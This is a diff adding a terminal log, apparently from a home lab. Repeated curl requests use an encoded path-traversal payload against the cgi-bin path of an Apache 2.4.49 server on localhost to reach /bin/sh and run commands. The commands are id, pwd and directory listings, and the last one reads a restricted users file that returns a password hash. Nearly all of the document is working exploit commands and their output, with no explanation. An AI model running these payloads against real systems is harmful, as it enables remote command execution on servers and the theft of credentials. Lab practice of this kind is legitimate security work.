@@ -1,0 +1,189 @@
+#using cgi-bin binding
+alebozek@fedora:~$ curl -v --path-as-is   -X POST   --data-binary "echo Content-Type: text/plain; echo; id"   "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host localhost:8080 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8080...
+* Connected to localhost (::1) port 8080
+* using HTTP/1.x
+> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+> Host: localhost:8080
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Content-Length: 39
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 39 bytes
+< HTTP/1.1 200 OK
+< Date: Mon, 27 Apr 2026 22:04:09 GMT
+< Server: Apache/2.4.49 (Unix)
+< Transfer-Encoding: chunked
+< Content-Type: text/plain
+< 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+* Connection #0 to host localhost left intact
+alebozek@fedora:~$ curl -v --path-as-is   -X POST   --data-binary "echo Content-Type: text/plain; echo; id"   "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/pwd"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host localhost:8080 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8080...
+* Connected to localhost (::1) port 8080
+* using HTTP/1.x
+> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/pwd HTTP/1.1
+> Host: localhost:8080
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Content-Length: 39
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 39 bytes
+< HTTP/1.1 500 Internal Server Error
+< Date: Mon, 27 Apr 2026 22:04:17 GMT
+< Server: Apache/2.4.49 (Unix)
+< Content-Length: 531
+< Connection: close
+< Content-Type: text/html; charset=iso-8859-1
+< 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>500 Internal Server Error</title>
+</head><body>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error or
+misconfiguration and was unable to complete
+your request.</p>
+<p>Please contact the server administrator at 
+ [no address given] to inform them of the time this error occurred,
+ and the actions you performed just before this error.</p>
+<p>More information about this error may be available
+in the server error log.</p>
+</body></html>
+* shutting down connection #0
+alebozek@fedora:~$ curl -v --path-as-is   -X POST   --data-binary "echo Content-Type: text/plain; echo; pwd"   "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host localhost:8080 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8080...
+* Connected to localhost (::1) port 8080
+* using HTTP/1.x
+> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+> Host: localhost:8080
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Content-Length: 40
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 40 bytes
+< HTTP/1.1 200 OK
+< Date: Mon, 27 Apr 2026 22:04:30 GMT
+< Server: Apache/2.4.49 (Unix)
+< Transfer-Encoding: chunked
+< Content-Type: text/plain
+< 
+/usr/bin
+* Connection #0 to host localhost left intact
+alebozek@fedora:~$ curl -v --path-as-is   -X POST   --data-binary "echo Content-Type: text/plain; echo; ls -la /var/www/html"   "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host localhost:8080 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8080...
+* Connected to localhost (::1) port 8080
+* using HTTP/1.x
+> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+> Host: localhost:8080
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Content-Length: 57
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 57 bytes
+< HTTP/1.1 200 OK
+< Date: Mon, 27 Apr 2026 22:05:25 GMT
+< Server: Apache/2.4.49 (Unix)
+< Transfer-Encoding: chunked
+< Content-Type: text/plain
+< 
+total 2848
+drwxr-xr-x. 1 root     root          20 Apr 27 21:59 .
+drwxr-xr-x. 1 root     root           8 Apr 27 22:00 ..
+drwxr-xr-x. 1 root     root         122 Apr 27 17:52 .git
+-rw-r--r--. 1 root     root          36 Apr 27 18:23 .htaccess
+-rw-r--r--. 1 root     root        2480 Apr 27 21:48 Dockerfile
+-rw-r--r--. 1 root     root        2396 Apr 27 19:02 Dockerfile.backup
+-rw-r--r--. 1 root     root        2445 Apr 27 18:24 about-me.php
+-rw-r--r--. 1 root     root        2163 Apr 27 21:59 apache-lab.conf
+drwxr-xr-x. 1 root     root           6 Apr 27 17:52 assets
+-rw-r--r--. 1 root     root          62 Apr 27 17:52 composer.json
+-rw-r--r--. 1 root     root     2862107 Apr 27 17:52 composer.phar
+-rw-r--r--. 1 root     root        1187 Apr 27 18:24 contact.php
+-rw-r--r--. 1 root     root         463 Apr 27 17:52 form.php
+-rw-r--r--. 1 root     root         287 Apr 27 17:52 functions.php
+-rw-r--r--. 1 root     root        1042 Apr 27 19:11 http.conf
+-rw-r--r--. 1 root     root         251 Apr 27 18:24 index.html
+-rw-r--r--. 1 root     root        1149 Apr 27 18:24 index.php
+drwxr-xr-x. 1 www-data www-data     104 Apr 27 18:27 posts
+-rw-r--r--. 1 root     root         754 Apr 27 18:24 posts.php
+drwxr-xr-x. 1 root     root          28 Apr 27 22:00 restricted
+drwxr-xr-x. 1 root     root          52 Apr 27 17:52 vendor
+drwxr-xr-x. 1 root     root          74 Apr 27 18:27 views
+* Connection #0 to host localhost left intact
+alebozek@fedora:~$ curl -v --path-as-is   -X POST   --data-binary "echo Content-Type: text/plain; echo; ls -la /var/www/html/restricted/"   "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host localhost:8080 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8080...
+* Connected to localhost (::1) port 8080
+* using HTTP/1.x
+> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+> Host: localhost:8080
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Content-Length: 69
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 69 bytes
+< HTTP/1.1 200 OK
+< Date: Mon, 27 Apr 2026 22:05:42 GMT
+< Server: Apache/2.4.49 (Unix)
+< Transfer-Encoding: chunked
+< Content-Type: text/plain
+< 
+total 16
+drwxr-xr-x. 1 root     root       28 Apr 27 22:00 .
+drwxr-xr-x. 1 root     root       20 Apr 27 21:59 ..
+-rw-r--r--. 1 root     root      177 Apr 27 22:00 .htaccess
+-rw-r--r--. 1 root     root     1049 Apr 27 17:52 admin.php
+-rw-r--r--. 1 root     root     1584 Apr 27 18:24 upload.php
+-rw-r--r--. 1 www-data www-data   48 Apr 27 22:00 users
+* Connection #0 to host localhost left intact
+alebozek@fedora:~$ curl -v --path-as-is   -X POST   --data-binary "echo Content-Type: text/plain; echo; cat /var/www/html/restricted/users"   "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host localhost:8080 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8080...
+* Connected to localhost (::1) port 8080
+* using HTTP/1.x
+> POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+> Host: localhost:8080
+> User-Agent: curl/8.11.1
+> Accept: */*
+> Content-Length: 71
+> Content-Type: application/x-www-form-urlencoded
+> 
+* upload completely sent off: 71 bytes
+< HTTP/1.1 200 OK
+< Date: Mon, 27 Apr 2026 22:06:05 GMT
+< Server: Apache/2.4.49 (Unix)
+< Transfer-Encoding: chunked
+< Content-Type: text/plain
+< 
+wiredl4bs:$apr1$6ojYkC5z$ETVjK0N9clT5rz8//85S//
+* Connection #0 to host localhost left intact
+alebozek@fedora:~$ 
+
